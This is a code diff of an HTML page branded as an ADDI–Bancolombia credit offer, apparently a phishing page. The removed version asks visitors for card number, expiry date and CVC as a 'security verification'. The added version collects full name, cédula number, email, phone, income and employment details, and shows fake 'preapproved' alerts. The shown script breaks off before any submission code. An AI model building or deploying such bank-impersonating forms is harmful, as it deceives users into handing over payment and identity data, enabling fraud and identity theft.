@@ -6,190 +6,181 @@
     <title>Crédito ADDI - Alianza Bancolombia</title>
     <!-- Bootstrap CSS -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
-    <!-- Font Awesome para iconos -->
+    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --addi-red: #FF6B6B;
-            --addi-orange: #FF8E53;
             --bancolombia-blue: #004884;
             --bancolombia-yellow: #FFC107;
             --bancolombia-light-blue: #E8F4FD;
+            --bancolombia-dark-blue: #003366;
+            --bancolombia-purple: #210049;
+            --bancolombia-pink: #d9006e;
+            --addi-red: #FF6B6B;
+            --addi-orange: #FF8E53;
         }
         
-        body {
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-            color: #333;
-            min-height: 100vh;
         }
-        
+
+        body {
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+
+        /* Header ADDI - Bancolombia */
+        .header-bancolombia {
+            background-color: #ffffff;
+            padding: 15px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
         .header-container {
-            background-color: white;
-            border-radius: 0 0 20px 20px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-            padding: 20px 0;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
-        
+
         .logo-section {
             display: flex;
-            justify-content: center;
             align-items: center;
-            gap: 30px;
-            flex-wrap: wrap;
+            gap: 20px;
         }
-        
-        .logo-addi {
-            height: 50px;
+
+        .logo-addi img {
+            height: 35px;
         }
-        
-        .logo-bancolombia {
+
+        .logo-bancolombia img {
             height: 40px;
         }
-        
+
         .partnership-text {
-            text-align: center;
-            color: var(--bancolombia-blue);
             font-weight: 600;
-            margin-top: 10px;
-        }
-        
-        .security-container {
-            max-width: 500px;
-            margin: 40px auto;
-            background-color: white;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            overflow: hidden;
-        }
-        
-        .security-header {
-            background: linear-gradient(135deg, var(--addi-red) 0%, var(--addi-orange) 100%);
-            color: white;
-            padding: 25px;
-            text-align: center;
-        }
-        
-        .security-body {
-            padding: 30px;
-        }
-        
-        .form-label {
-            font-weight: 600;
-            color: var(--bancolombia-blue);
-        }
-        
-        .form-control {
-            border-radius: 8px;
-            padding: 12px 15px;
-            border: 1px solid #ddd;
-            transition: all 0.3s;
-        }
-        
-        .form-control:focus {
-            border-color: var(--addi-red);
-            box-shadow: 0 0 0 0.2rem rgba(255, 107, 107, 0.25);
-        }
-        
-        .card-input-container {
-            position: relative;
-        }
-        
-        .card-icon {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #6c757d;
-        }
-        
-        .btn-addi {
-            background: linear-gradient(135deg, var(--addi-red) 0%, var(--addi-orange) 100%);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 14px 20px;
-            font-weight: 600;
-            width: 100%;
-            transition: all 0.3s;
-            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.3);
-        }
-        
-        .btn-addi:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.4);
-        }
-        
-        .security-info {
-            background-color: var(--bancolombia-light-blue);
-            border-left: 4px solid var(--bancolombia-blue);
-            padding: 15px;
-            margin-bottom: 20px;
-            border-radius: 0 8px 8px 0;
-        }
-        
-        .security-info i {
-            color: var(--bancolombia-blue);
-            margin-right: 10px;
-        }
-        
-        .input-group {
-            margin-bottom: 20px;
-        }
-        
-        .footer {
-            text-align: center;
-            margin-top: 30px;
-            color: #6c757d;
+            color: var(--bancolombia-purple);
             font-size: 0.9rem;
         }
-        
-        .error-message {
-            color: #dc3545;
-            font-size: 0.875rem;
-            margin-top: 5px;
-            display: none;
+
+        .header-buttons {
+            display: flex;
+            gap: 15px;
         }
-        
-        .loading {
-            display: none;
+
+        .btn-sucursal {
+            background-color: var(--bancolombia-purple);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.9rem;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn-sucursal:hover {
+            background-color: #3a1a6b;
+        }
+
+        /* Banner Principal */
+        .banner-container {
+            background-color: #FFFFFF;
+            padding: 60px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .banner-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 60px;
+            align-items: center;
+        }
+
+        .banner-text {
+            padding: 20px;
+        }
+
+        .banner-text h1 {
+            font-size: 2.5rem;
+            color: var(--bancolombia-purple);
+            margin-bottom: 20px;
+            font-weight: 700;
+            line-height: 1.2;
+        }
+
+        .banner-text p {
+            font-size: 1.1rem;
+            color: #333;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .banner-button {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--addi-red) 0%, var(--addi-orange) 100%);
+            color: white;
+            padding: 16px 35px;
+            border-radius: 60px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(255, 107, 107, 0.3);
+        }
+
+        .banner-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(255, 107, 107, 0.4);
+        }
+
+        .banner-image {
             text-align: center;
-            margin-top: 15px;
         }
-        
-        .success-message {
-            display: none;
-            text-align: center;
-            color: #198754;
-            margin-top: 15px;
+
+        .banner-image img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 12px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
         }
-        
-        .benefits-section {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
-            padding: 25px;
-            margin: 30px auto;
-            max-width: 500px;
-            backdrop-filter: blur(10px);
+
+        /* Proceso ADDI */
+        .process-section {
+            background-color: var(--bancolombia-blue);
+            padding: 50px 20px;
             color: white;
         }
-        
-        .benefit-item {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
+
+        .process-container {
+            max-width: 1000px;
+            margin: 0 auto;
         }
-        
-        .benefit-icon {
-            font-size: 1.5rem;
-            margin-right: 15px;
-            color: var(--bancolombia-yellow);
+
+        .process-title {
+            font-size: 2rem;
+            margin-bottom: 40px;
+            text-align: center;
+            font-weight: 700;
         }
-        
+
         .process-steps {
             display: flex;
             justify-content: center;
-            gap: 30px;
+            gap: 40px;
             margin: 30px 0;
             position: relative;
         }
@@ -197,10 +188,10 @@
         .process-steps:before {
             content: '';
             position: absolute;
-            top: 25px;
+            top: 30px;
             left: 10%;
             right: 10%;
-            height: 2px;
+            height: 3px;
             background: rgba(255, 255, 255, 0.3);
             z-index: 1;
         }
@@ -213,221 +204,707 @@
         }
         
         .step-number {
-            width: 50px;
-            height: 50px;
+            width: 60px;
+            height: 60px;
             border-radius: 50%;
             background: white;
             color: var(--bancolombia-blue);
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 10px;
+            margin: 0 auto 15px;
             font-weight: bold;
-            font-size: 1.2rem;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
+            font-size: 1.5rem;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
         }
         
         .step-title {
             font-weight: 600;
-            font-size: 1rem;
-            color: white;
+            font-size: 1.1rem;
         }
-        
+
+        /* Beneficios */
+        .benefits-section {
+            background-color: #FFFFFF;
+            padding: 60px 20px;
+        }
+
+        .benefits-container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .benefits-title {
+            font-size: 2.2rem;
+            color: var(--bancolombia-purple);
+            margin-bottom: 40px;
+            text-align: center;
+            font-weight: 700;
+        }
+
+        .benefits-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+        }
+
+        .benefit-card {
+            background: white;
+            border-radius: 12px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            transition: transform 0.3s ease;
+        }
+
+        .benefit-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .benefit-icon {
+            font-size: 2.5rem;
+            color: var(--addi-red);
+            margin-bottom: 20px;
+        }
+
+        .benefit-card h4 {
+            color: var(--bancolombia-purple);
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        /* Formulario de Solicitud */
+        .application-section {
+            background-color: #F8F9FA;
+            padding: 60px 20px;
+        }
+
+        .application-container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .application-title {
+            font-size: 2.2rem;
+            color: var(--bancolombia-purple);
+            margin-bottom: 20px;
+            font-weight: 700;
+            text-align: center;
+        }
+
+        .application-subtitle {
+            font-size: 1.1rem;
+            color: #666;
+            margin-bottom: 50px;
+            text-align: center;
+            max-width: 700px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .application-card {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+        }
+
+        .application-header {
+            background: linear-gradient(135deg, var(--addi-red) 0%, var(--addi-orange) 100%);
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+
+        .application-body {
+            padding: 40px;
+        }
+
+        .form-label {
+            font-weight: 600;
+            color: var(--bancolombia-blue);
+            margin-bottom: 8px;
+        }
+
+        .form-control {
+            border-radius: 8px;
+            padding: 14px 15px;
+            border: 1.5px solid #e0e0e0;
+            transition: all 0.3s;
+            font-size: 16px;
+        }
+
+        .form-control:focus {
+            border-color: var(--addi-red);
+            box-shadow: 0 0 0 0.2rem rgba(255, 107, 107, 0.15);
+        }
+
+        .form-select {
+            border-radius: 8px;
+            padding: 14px 15px;
+            border: 1.5px solid #e0e0e0;
+            transition: all 0.3s;
+            font-size: 16px;
+        }
+
+        .form-select:focus {
+            border-color: var(--addi-red);
+            box-shadow: 0 0 0 0.2rem rgba(255, 107, 107, 0.15);
+        }
+
+        .btn-addi {
+            background: linear-gradient(135deg, var(--addi-red) 0%, var(--addi-orange) 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 14px 20px;
+            font-weight: 700;
+            width: 100%;
+            transition: all 0.3s;
+            font-size: 16px;
+            box-shadow: 0 4px 6px rgba(255, 107, 107, 0.2);
+        }
+
+        .btn-addi:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(255, 107, 107, 0.3);
+        }
+
+        .security-info {
+            background-color: var(--bancolombia-light-blue);
+            border-left: 4px solid var(--bancolombia-blue);
+            padding: 16px;
+            margin-bottom: 25px;
+            border-radius: 0 8px 8px 0;
+            font-size: 0.95rem;
+        }
+
+        .error-message {
+            color: #dc3545;
+            font-size: 0.875rem;
+            margin-top: 6px;
+            display: none;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .success-message {
+            display: none;
+            text-align: center;
+            color: #198754;
+            margin-top: 15px;
+            font-weight: 600;
+        }
+
+        .spinner-border {
+            width: 1.5rem;
+            height: 1.5rem;
+        }
+
+        .alert-custom {
+            position: fixed;
+            top: 100px;
+            right: 20px;
+            z-index: 1050;
+            border-radius: 8px;
+            padding: 15px 20px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            display: none;
+            max-width: 350px;
+        }
+
+        .alert-preapproved {
+            background-color: #d4edda;
+            color: #155724;
+            border-left: 4px solid #28a745;
+        }
+
+        .alert-processing {
+            background-color: #cce7ff;
+            color: #004085;
+            border-left: 4px solid #007bff;
+        }
+
+        .alert-warning {
+            background-color: #fff3cd;
+            color: #856404;
+            border-left: 4px solid #ffc107;
+        }
+
+        /* Footer */
+        .footer {
+            background-color: var(--bancolombia-purple);
+            color: white;
+            padding: 50px 20px 30px;
+        }
+
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+        }
+
+        .footer-section h4 {
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section ul li {
+            margin-bottom: 10px;
+        }
+
+        .footer-section a {
+            color: #ccc;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .footer-section a:hover {
+            color: var(--bancolombia-yellow);
+        }
+
+        .footer-bottom {
+            max-width: 1200px;
+            margin: 40px auto 0;
+            padding-top: 30px;
+            border-top: 1px solid #333;
+            text-align: center;
+            color: #ccc;
+            font-size: 0.9rem;
+        }
+
+        .footer-logo {
+            margin-bottom: 20px;
+        }
+
+        .footer-logo img {
+            height: 40px;
+            filter: brightness(0) invert(1);
+        }
+
+        /* Responsive */
         @media (max-width: 768px) {
+            .header-container {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .banner-content {
+                grid-template-columns: 1fr;
+                text-align: center;
+                gap: 40px;
+            }
+            
+            .banner-text h1 {
+                font-size: 2rem;
+            }
+            
+            .application-title {
+                font-size: 1.8rem;
+            }
+            
+            .application-body {
+                padding: 25px 20px;
+            }
+            
+            .footer-container {
+                grid-template-columns: 1fr;
+                text-align: center;
+            }
+            
+            .alert-custom {
+                right: 10px;
+                left: 10px;
+                max-width: none;
+            }
+            
             .process-steps {
                 flex-direction: column;
-                gap: 20px;
+                gap: 30px;
             }
             
             .process-steps:before {
                 display: none;
             }
+        }
+
+        @media (max-width: 480px) {
+            .banner-container {
+                padding: 40px 15px;
+            }
             
-            .logo-section {
-                gap: 15px;
+            .banner-text h1 {
+                font-size: 1.8rem;
+            }
+            
+            .application-section {
+                padding: 40px 15px;
             }
         }
     </style>
 </head>
 <body>
-    <!-- Header con logos ADDI y Bancolombia -->
-    <div class="header-container">
-        <div class="container">
+    <!-- Header ADDI - Bancolombia -->
+    <header class="header-bancolombia">
+        <div class="header-container">
             <div class="logo-section">
-                <img src="https://www.addi.com/wp-content/uploads/2021/06/ADDI_Logo_White.png" alt="ADDI" class="logo-addi" style="filter: brightness(0) saturate(100%) invert(33%) sepia(90%) saturate(1000%) hue-rotate(200deg) brightness(90%) contrast(90%);">
-                <span class="fs-4 text-muted">+</span>
-                <img src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/1c0c5f5c-8c3f-4f6a-8f6f-1e7f5f5f5f5f/logo-bancolombia.png" alt="Bancolombia" class="logo-bancolombia">
-            </div>
-            <div class="partnership-text">
-                <h3>Crédito ADDI con la seguridad de Bancolombia</h3>
-                <p class="mb-0">Solicita tu crédito y recíbelo en minutos con nuestra alianza estratégica</p>
+                <div class="logo-addi">
+                    <img src="https://www.addi.com/wp-content/uploads/2021/06/ADDI_Logo_White.png" alt="ADDI" style="filter: brightness(0) saturate(100%) invert(33%) sepia(90%) saturate(1000%) hue-rotate(200deg) brightness(90%) contrast(90%);">
+                </div>
+                <div class="logo-bancolombia">
+                    <img src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES" alt="Bancolombia">
+                </div>
+                <div class="partnership-text">
+                    Alianza Estratégica
+                </div>
             </div>
         </div>
+    </header>
+
+    <!-- Alertas -->
+    <div class="alert-custom alert-preapproved" id="alertPreapproved">
+        <i class="fas fa-check-circle me-2"></i> <strong>¡Preaprobado!</strong> Su crédito ADDI ha sido preaprobado.
+    </div>
+    
+    <div class="alert-custom alert-processing" id="alertProcessing">
+        <i class="fas fa-sync-alt me-2"></i> <strong>En proceso</strong> Estamos analizando su información.
+    </div>
+    
+    <div class="alert-custom alert-warning" id="alertWarning">
+        <i class="fas fa-exclamation-triangle me-2"></i> <strong>Complete los datos</strong> para conocer su capacidad de crédito ADDI.
     </div>
 
-    <div class="container">
-        <!-- Proceso ADDI -->
-        <div class="process-steps">
-            <div class="process-step">
-                <div class="step-number">1</div>
-                <div class="step-title">Solicita en línea</div>
+    <!-- Banner Principal -->
+    <section class="banner-container">
+        <div class="banner-content">
+            <div class="banner-text">
+                <h1>Crédito ADDI con la seguridad de Bancolombia</h1>
+                <p>Solicita tu crédito digital y recíbelo en minutos. Con la alianza ADDI - Bancolombia, obtén tasas preferenciales y la confianza de la entidad financiera más grande de Colombia.</p>
+                <a href="#application" class="banner-button">Solicitar Crédito ADDI</a>
             </div>
-            <div class="process-step">
-                <div class="step-number">2</div>
-                <div class="step-title">Verificación de seguridad</div>
-            </div>
-            <div class="process-step">
-                <div class="step-number">3</div>
-                <div class="step-title">Dinero en minutos</div>
+            <div class="banner-image">
+                <img src="https://www.addi.com/wp-content/uploads/2021/06/ADDI_App_Screenshot.png" alt="Crédito ADDI">
             </div>
         </div>
+    </section>
 
-        <!-- Beneficios -->
-        <div class="benefits-section">
-            <h4 class="text-center mb-4">Beneficios de tu Crédito ADDI</h4>
-            <div class="benefit-item">
-                <i class="fas fa-bolt benefit-icon"></i>
-                <div>
-                    <strong>Aprobación inmediata</strong>
-                    <p class="mb-0">Respuesta en segundos, dinero en minutos</p>
+    <!-- Proceso ADDI -->
+    <section class="process-section">
+        <div class="process-container">
+            <h2 class="process-title">Cómo funciona tu Crédito ADDI</h2>
+            <div class="process-steps">
+                <div class="process-step">
+                    <div class="step-number">1</div>
+                    <div class="step-title">Solicita en línea</div>
                 </div>
-            </div>
-            <div class="benefit-item">
-                <i class="fas fa-shield-alt benefit-icon"></i>
-                <div>
-                    <strong>Seguridad Bancolombia</strong>
-                    <p class="mb-0">Tus datos protegidos con los más altos estándares</p>
+                <div class="process-step">
+                    <div class="step-number">2</div>
+                    <div class="step-title">Aprobación inmediata</div>
                 </div>
-            </div>
-            <div class="benefit-item">
-                <i class="fas fa-hand-holding-usd benefit-icon"></i>
-                <div>
-                    <strong>Hasta $50.000.000</strong>
-                    <p class="mb-0">Líneas de crédito adaptadas a tus necesidades</p>
+                <div class="process-step">
+                    <div class="step-number">3</div>
+                    <div class="step-title">Dinero en minutos</div>
                 </div>
             </div>
         </div>
+    </section>
 
-        <!-- Contenedor del formulario -->
-        <div class="security-container">
-            <div class="security-header">
-                <h3><i class="fas fa-shield-alt me-2"></i>Verificación de Seguridad</h3>
-                <p class="mb-0">Para acceder a tu crédito ADDI, completa la siguiente información</p>
+    <!-- Beneficios -->
+    <section class="benefits-section">
+        <div class="benefits-container">
+            <h2 class="benefits-title">Beneficios de tu Crédito ADDI</h2>
+            <div class="benefits-grid">
+                <div class="benefit-card">
+                    <div class="benefit-icon">
+                        <i class="fas fa-bolt"></i>
+                    </div>
+                    <h4>Velocidad</h4>
+                    <p>Aprobación en segundos y desembolso en minutos, no en días.</p>
+                </div>
+                <div class="benefit-card">
+                    <div class="benefit-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <h4>Seguridad</h4>
+                    <p>Respaldado por los estándares de seguridad de Bancolombia.</p>
+                </div>
+                <div class="benefit-card">
+                    <div class="benefit-icon">
+                        <i class="fas fa-hand-holding-usd"></i>
+                    </div>
+                    <h4>Flexibilidad</h4>
+                    <p>Múltiples opciones de pago y plazos adaptados a ti.</p>
+                </div>
+                <div class="benefit-card">
+                    <div class="benefit-icon">
+                        <i class="fas fa-mobile-alt"></i>
+                    </div>
+                    <h4>100% Digital</h4>
+                    <p>Todo el proceso desde tu dispositivo, sin papeleos.</p>
+                </div>
             </div>
+        </div>
+    </section>
+
+    <!-- Formulario de Solicitud -->
+    <section class="application-section" id="application">
+        <div class="application-container">
+            <h2 class="application-title">Solicita tu Crédito ADDI</h2>
+            <p class="application-subtitle">Completa la información solicitada para evaluar tu capacidad de crédito. Todos los campos son obligatorios.</p>
             
-            <div class="security-body">
-                <div class="security-info">
-                    <p class="mb-0"><i class="fas fa-info-circle"></i>Esta información es necesaria para validar tu identidad y proteger tu cuenta con los estándares de seguridad de Bancolombia.</p>
+            <div class="application-card">
+                <div class="application-header">
+                    <h3>Información para tu Crédito ADDI</h3>
+                    <p class="mb-0">Complete todos los campos para continuar con su solicitud</p>
                 </div>
                 
-                <form id="securityForm">
-                    <div class="mb-4">
-                        <label for="cardNumber" class="form-label">Número de Tarjeta</label>
-                        <div class="card-input-container">
-                            <input type="text" 
-                                   class="form-control" 
-                                   id="cardNumber" 
-                                   placeholder="1234 5678 9012 3456"
-                                   maxlength="19"
-                                   required>
-                            <i class="fas fa-credit-card card-icon"></i>
-                        </div>
-                        <div class="error-message" id="cardNumberError">Por favor ingrese un número de tarjeta válido (16 dígitos)</div>
+                <div class="application-body">
+                    <div class="security-info">
+                        <i class="fas fa-info-circle me-2"></i> Esta información es confidencial y será utilizada únicamente para evaluar su solicitud de crédito ADDI.
                     </div>
                     
-                    <div class="row">
-                        <div class="col-md-6 mb-4">
-                            <label for="expiryDate" class="form-label">Fecha de Expiración</label>
-                            <input type="text" 
-                                   class="form-control" 
-                                   id="expiryDate" 
-                                   placeholder="MM/AA"
-                                   maxlength="5"
-                                   required>
-                            <div class="error-message" id="expiryDateError">Por favor ingrese una fecha válida (MM/AA)</div>
-                        </div>
-                        
-                        <div class="col-md-6 mb-4">
-                            <label for="cvc" class="form-label">Código de Seguridad (CVC)</label>
-                            <div class="card-input-container">
+                    <form id="creditForm">
+                        <div class="row">
+                            <div class="col-md-6 mb-4">
+                                <label for="fullName" class="form-label">Nombre Completo</label>
                                 <input type="text" 
                                        class="form-control" 
-                                       id="cvc" 
-                                       placeholder="123"
-                                       maxlength="3"
+                                       id="fullName" 
+                                       placeholder="Ingrese su nombre completo"
                                        required>
-                                <i class="fas fa-lock card-icon"></i>
+                                <div class="error-message" id="fullNameError">Por favor ingrese su nombre completo</div>
                             </div>
-                            <div class="error-message" id="cvcError">Por favor ingrese un CVC válido (3 dígitos)</div>
+                            
+                            <div class="col-md-6 mb-4">
+                                <label for="idNumber" class="form-label">Número de Cédula</label>
+                                <input type="text" 
+                                       class="form-control" 
+                                       id="idNumber" 
+                                       placeholder="Ingrese su número de cédula"
+                                       maxlength="15"
+                                       required>
+                                <div class="error-message" id="idNumberError">Por favor ingrese un número de cédula válido</div>
+                            </div>
                         </div>
-                    </div>
-                    
-                    <button type="submit" class="btn btn-addi">
-                        <i class="fas fa-paper-plane me-2"></i>Verificar y Solicitar Crédito
-                    </button>
-                    
-                    <div class="loading" id="loading">
-                        <div class="spinner-border text-primary" role="status">
-                            <span class="visually-hidden">Procesando...</span>
+                        
+                        <div class="row">
+                            <div class="col-md-6 mb-4">
+                                <label for="email" class="form-label">Correo Electrónico</label>
+                                <input type="email" 
+                                       class="form-control" 
+                                       id="email" 
+                                       placeholder="ejemplo@correo.com"
+                                       required>
+                                <div class="error-message" id="emailError">Por favor ingrese un correo electrónico válido</div>
+                            </div>
+                            
+                            <div class="col-md-6 mb-4">
+                                <label for="phone" class="form-label">Teléfono de Contacto</label>
+                                <input type="tel" 
+                                       class="form-control" 
+                                       id="phone" 
+                                       placeholder="Ingrese su número de teléfono"
+                                       required>
+                                <div class="error-message" id="phoneError">Por favor ingrese un número de teléfono válido</div>
+                            </div>
                         </div>
-                        <p class="mt-2">Verificando información...</p>
-                    </div>
+                        
+                        <div class="mb-4">
+                            <label for="employmentStatus" class="form-label">Estado Laboral</label>
+                            <select class="form-select" id="employmentStatus" required>
+                                <option value="" selected disabled>Seleccione su estado laboral</option>
+                                <option value="employed">Empleado</option>
+                                <option value="self-employed">Independiente</option>
+                                <option value="unemployed">Desempleado</option>
+                                <option value="student">Estudiante</option>
+                                <option value="retired">Pensionado</option>
+                            </select>
+                            <div class="error-message" id="employmentStatusError">Por favor seleccione su estado laboral</div>
+                        </div>
+                        
+                        <div class="mb-4">
+                            <label for="monthlyIncome" class="form-label">Ingresos Mensuales</label>
+                            <div class="input-group">
+                                <span class="input-group-text">$</span>
+                                <input type="text" 
+                                       class="form-control" 
+                                       id="monthlyIncome" 
+                                       placeholder="Ingrese sus ingresos mensuales"
+                                       required>
+                            </div>
+                            <div class="error-message" id="monthlyIncomeError">Por favor ingrese sus ingresos mensuales</div>
+                        </div>
+                        
+                        <div class="mb-4">
+                            <label for="creditAmount" class="form-label">Monto Solicitado</label>
+                            <div class="input-group">
+                                <span class="input-group-text">$</span>
+                                <input type="text" 
+                                       class="form-control" 
+                                       id="creditAmount" 
+                                       placeholder="Ingrese el monto que desea solicitar"
+                                       required>
+                            </div>
+                            <div class="error-message" id="creditAmountError">Por favor ingrese el monto que desea solicitar</div>
+                        </div>
+                        
+                        <div class="mb-4">
+                            <label for="creditPurpose" class="form-label">Propósito del Crédito</label>
+                            <select class="form-select" id="creditPurpose" required>
+                                <option value="" selected disabled>Seleccione el propósito del crédito</option>
+                                <option value="debt-consolidation">Consolidación de deudas</option>
+                                <option value="home-improvement">Mejora del hogar</option>
+                                <option value="education">Educación</option>
+                                <option value="travel">Viajes</option>
+                                <option value="health">Salud</option>
+                                <option value="business">Negocio</option>
+                                <option value="other">Otro</option>
+                            </select>
+                            <div class="error-message" id="creditPurposeError">Por favor seleccione el propósito del crédito</div>
+                        </div>
+                        
+                        <div class="mb-4">
+                            <label for="employmentTime" class="form-label">Tiempo en su Trabajo Actual</label>
+                            <select class="form-select" id="employmentTime" required>
+                                <option value="" selected disabled>Seleccione el tiempo</option>
+                                <option value="less-than-year">Menos de 1 año</option>
+                                <option value="1-3-years">1 a 3 años</option>
+                                <option value="3-5-years">3 a 5 años</option>
+                                <option value="more-than-5">Más de 5 años</option>
+                            </select>
+                            <div class="error-message" id="employmentTimeError">Por favor seleccione el tiempo en su trabajo actual</div>
+                        </div>
+                        
+                        <div class="mb-4 form-check">
+                            <input type="checkbox" class="form-check-input" id="termsCheck" required>
+                            <label class="form-check-label" for="termsCheck">
+                                Acepto los <a href="#" class="text-decoration-none">términos y condiciones</a> y autorizo el tratamiento de mis datos personales
+                            </label>
+                            <div class="error-message" id="termsCheckError">Debe aceptar los términos y condiciones</div>
+                        </div>
+                        
+                        <button type="submit" class="btn btn-addi">
+                            <i class="fas fa-paper-plane me-2"></i> Verificar Preaprobación ADDI
+                        </button>
+                        
+                        <div class="loading" id="loading">
+                            <div class="spinner-border text-primary" role="status">
+                                <span class="visually-hidden">Procesando...</span>
+                            </div>
+                            <p class="mt-2">Analizando su información para crédito ADDI...</p>
+                        </div>
+                    </form>
                     
-                    <div class="success-message" id="successMessage">
-                        <i class="fas fa-check-circle fa-2x mb-2"></i>
-                        <p>¡Verificación exitosa! Tu crédito ADDI está siendo procesado</p>
+                    <div class="footer mt-4">
+                        <p class="text-center" style="color: #6c757d; font-size: 0.85rem;">
+                            <i class="fas fa-lock me-1"></i> Alianza ADDI - Bancolombia | Sus datos están protegidos
+                        </p>
                     </div>
-                </form>
-                
-                <div class="footer">
-                    <p><i class="fas fa-lock me-1"></i>Alianza ADDI - Bancolombia | Tus datos están protegidos</p>
                 </div>
             </div>
         </div>
-    </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-section">
+                <div class="footer-logo">
+                    <img src="https://www.addi.com/wp-content/uploads/2021/06/ADDI_Logo_White.png" alt="ADDI">
+                </div>
+                <p>Créditos digitales con la seguridad de Bancolombia. ADDI contigo en cada paso.</p>
+            </div>
+            
+            <div class="footer-section">
+                <h4>Te puede interesar</h4>
+                <ul>
+                    <li><a href="#">Centro de Ayuda ADDI</a></li>
+                    <li><a href="#">App ADDI</a></li>
+                    <li><a href="#">Preguntas Frecuentes</a></li>
+                    <li><a href="#">Seguridad Digital</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-section">
+                <h4>Legales</h4>
+                <ul>
+                    <li><a href="#">Términos y Condiciones</a></li>
+                    <li><a href="#">Protección de Datos</a></li>
+                    <li><a href="#">Transparencia</a></li>
+                    <li><a href="#">Atención al Consumidor</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-section">
+                <h4>Contáctanos</h4>
+                <ul>
+                    <li>Línea ADDI: 01 8000 519999</li>
+                    <li>Email: info@addi.com</li>
+                    <li>Bogotá, Colombia</li>
+                    <li><a href="#">Chat en Línea</a></li>
+                </ul>
+            </div>
+        </div>
+        
+        <div class="footer-bottom">
+            <p>&copy; 2024 ADDI - Alianza Bancolombia. Todos los derechos reservados</p>
+        </div>
+    </footer>
 
     <!-- Bootstrap JS -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
     
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            const form = document.getElementById('securityForm');
-            const cardNumberInput = document.getElementById('cardNumber');
-            const expiryDateInput = document.getElementById('expiryDate');
-            const cvcInput = document.getElementById('cvc');
+            const form = document.getElementById('creditForm');
             const loadingElement = document.getElementById('loading');
-            const successMessage = document.getElementById('successMessage');
+            const alertPreapproved = document.getElementById('alertPreapproved');
+            const alertProcessing = document.getElementById('alertProcessing');
+            const alertWarning = document.getElementById('alertWarning');
             
-            // Formatear número de tarjeta (agregar espacios cada 4 dígitos)
-            cardNumberInput.addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-                let formattedValue = '';
-                
-                for (let i = 0; i < value.length; i++) {
-                    if (i > 0 && i % 4 === 0) {
-                        formattedValue += ' ';
-                    }
-                    formattedValue += value[i];
-                }
-                
